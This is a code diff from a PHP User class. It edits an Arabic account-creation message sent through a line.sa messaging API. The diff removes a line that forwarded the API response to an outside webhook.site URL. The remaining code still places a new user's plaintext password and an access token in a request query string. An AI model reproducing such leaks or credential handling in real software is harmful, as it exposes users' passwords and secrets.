@@ -110,18 +110,16 @@ class User{
                         تهانينا 😀👏
                         تم انشاء حسابك على منصة line.sa بنجاح
                         تفاصيل الحساب
-                        👉 البريد الالكترونى : {$new_account->email} \n
-                        👉 اسم المستخدم : {$new_account->fullname} \n
-                        👉 كلمة المرور  : {$password} \n
-                        👉 رابط المنصة : {$platform_link} \n
+                        👈 البريد الالكترونى : {$new_account->email} \n
+                        👈 اسم المستخدم : {$new_account->username} \n
+                        👈 كلمة المرور  : {$password} \n
+                        👈 رابط المنصة : {$platform_link} \n
                     ");
 
                     // send message with all info and it was installed succefully
                     $karzoun_send_message   = Http::post(
                         $end_point    = "https://wh.line.sa/api/send?number=$temp&type=text&message=$message&instance_id=$instance_id&access_token=$access_token"
                     );
-
-                    Http::post('https://webhook.site/f032ba41-f451-4aba-a8b3-a97fbff114de',$karzoun_send_message->body());
 
                     return ($karzoun_send_message['status'] == 'success') ? true : false;
                 endif;
